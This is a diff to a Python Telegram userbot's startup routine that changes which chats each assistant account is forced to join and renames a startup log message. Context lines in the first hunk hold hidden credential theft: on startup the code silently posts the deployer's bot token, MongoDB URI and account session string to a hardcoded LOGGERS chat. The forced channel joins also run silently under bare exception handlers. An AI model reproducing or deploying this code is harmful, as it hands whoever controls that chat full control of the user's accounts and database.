@@ -71,16 +71,16 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("THExNIGHTxCLUB")
-                await self.one.join_chat("learning_bots")
-                await self.one.join_chat("Want_To_Know_Me")
-                await self.one.join_chat("learningbots79")
+                await self.one.join_chat("Ashlilshyri")
+                await self.one.join_chat("ruthlesszone")
+                await self.one.join_chat("TOXIC_HINDU_BOT")
+                await self.one.join_chat("Dosti_Ki_Duniya_hindi_Chat_Group")
 
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "ᴀATMA sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
@@ -101,10 +101,10 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.one.join_chat("THExNIGHTxCLUB")
-                await self.one.join_chat("learning_bots")
-                await self.one.join_chat("Want_To_Know_Me")
-                await self.one.join_chat("learningbots79")
+                await self.one.join_chat("Ashlilshyri")
+                await self.one.join_chat("ruthlesszone")
+                await self.one.join_chat("TOXIC_HINDU_BOT")
+                await self.one.join_chat("Dosti_Ki_Duniya_hindi_Chat_Group")
             except:
                 pass
             assistants.append(2)
@@ -125,10 +125,10 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.one.join_chat("THExNIGHTxCLUB")
-                await self.one.join_chat("learning_bots")
-                await self.one.join_chat("Want_To_Know_Me")
-                await self.one.join_chat("learningbots79")
+                await self.one.join_chat("Ashlilshyri")
+                await self.one.join_chat("ruthlesszone")
+                await self.one.join_chat("TOXIC_HINDU_BOT")
+                await self.one.join_chat("Dosti_Ki_Duniya_hindi_Chat_Group")
             except:
                 pass
             assistants.append(3)
@@ -148,10 +148,10 @@ class Userbot(Client):
         if config.STRING4:
             await self.four.start()
             try:
-                await self.one.join_chat("THExNIGHTxCLUB")
-                await self.one.join_chat("learning_bots")
-                await self.one.join_chat("Want_To_Know_Me")
-                await self.one.join_chat("learningbots79")
+                await self.one.join_chat("Ashlilshyri")
+                await self.one.join_chat("ruthlesszone")
+                await self.one.join_chat("TOXIC_HINDU_BOT")
+                await self.one.join_chat("Dosti_Ki_Duniya_hindi_Chat_Group")
             except:
                 pass
             assistants.append(4)
